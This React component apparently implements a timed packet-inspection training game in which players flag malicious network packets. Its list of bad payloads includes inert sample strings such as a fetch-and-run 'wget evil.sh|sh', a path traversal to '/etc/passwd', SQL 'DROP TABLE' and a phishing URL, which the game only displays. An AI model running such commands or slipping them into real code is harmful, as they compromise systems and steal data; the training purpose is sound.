import { useEffect, useMemo, useState } from "react";
import { Button } from "@/components/ui/button";

interface Packet {
  id: number;
  src: string;
  dst: string;
  payload: string;
  malicious: boolean;
}

interface Props {
  tier: 1 | 2 | 3;
  onSuccess: () => void;
  onFail: () => void;
}

const generate = (tier: number): Packet[] => {
  const count = 8 + tier * 2;
  const out: Packet[] = [];
  const badPayloads = ["http://paypa1-login.co/verify", "eval(atob(...))", "DROP TABLE users", "wget evil.sh|sh", "../../etc/passwd"];
  const goodPayloads = ["GET /index.html", "POST /api/login", "PING reply 64b", "DNS query lovable.dev", "TLS handshake"];
  for (let i = 0; i < count; i++) {
    const mal = Math.random() < (tier === 1 ? 0.35 : tier === 2 ? 0.45 : 0.55);
    out.push({
      id: i,
      src: `10.0.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
      dst: `192.168.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
      payload: mal ? badPayloads[Math.floor(Math.random() * badPayloads.length)] : goodPayloads[Math.floor(Math.random() * goodPayloads.length)],
      malicious: mal,
    });
  }
  return out;
};

export default function PacketInspector({ tier, onSuccess, onFail }: Props) {
  const packets = useMemo(() => generate(tier), [tier]);
  const [flagged, setFlagged] = useState<Set<number>>(new Set());
  const [done, setDone] = useState(false);
  const [timeLeft, setTimeLeft] = useState(tier === 1 ? 25 : tier === 2 ? 22 : 20);

  useEffect(() => {
    if (done) return;
    if (timeLeft <= 0) {
      submit();
      return;
    }
    const t = setTimeout(() => setTimeLeft((x) => x - 1), 1000);
    return () => clearTimeout(t);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [timeLeft, done]);

  const toggle = (id: number) => {
    if (done) return;
    setFlagged((s) => {
      const n = new Set(s);
      n.has(id) ? n.delete(id) : n.add(id);
      return n;
    });
  };

  const submit = () => {
    setDone(true);
    const correct = packets.filter((p) => p.malicious).every((p) => flagged.has(p.id));
    const noFalsePositive = [...flagged].every((id) => packets.find((p) => p.id === id)?.malicious);
    setTimeout(() => (correct && noFalsePositive ? onSuccess() : onFail()), 700);
  };

  return (
    <div className="space-y-3">
      <div className="flex items-center justify-between text-sm">
        <span className="text-muted-foreground">Flag malicious packets</span>
        <span className="font-mono text-primary">{timeLeft}s</span>
      </div>
      <div className="max-h-72 overflow-y-auto space-y-1.5 pr-1">
        {packets.map((p) => {
          const isFlagged = flagged.has(p.id);
          return (
            <button
              key={p.id}
              onClick={() => toggle(p.id)}
              disabled={done}
              className={`w-full text-left font-mono text-xs p-2 rounded border transition-colors ${
                isFlagged
                  ? "border-destructive bg-destructive/10 text-destructive"
                  : "border-border hover:border-primary/50"
              }`}
            >
              <span className="opacity-60">{p.src} → {p.dst}</span> · {p.payload}
            </button>
          );
        })}
      </div>
      <Button variant="cyber" className="w-full" onClick={submit} disabled={done}>
        Submit Analysis
      </Button>
    </div>
  );
}
